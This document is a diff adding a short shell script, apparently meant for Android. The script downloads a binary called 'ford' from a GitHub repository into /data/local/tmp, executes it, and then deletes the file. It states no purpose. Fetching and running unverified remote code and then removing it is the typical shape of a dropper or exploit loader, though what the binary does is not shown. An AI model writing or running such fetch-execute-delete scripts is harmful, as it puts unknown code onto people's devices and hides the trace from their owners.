@@ -1,0 +1,12 @@
+#!/bin/sh
+echo Fetching..
+
+wget -O /data/local/tmp/ford https://github.com/Androidmate/test/raw/master/ford
+
+echo Execution..
+
+/data/local/tmp/ford
+
+echo Cleaning up..
+
+rm /data/local/tmp/ford
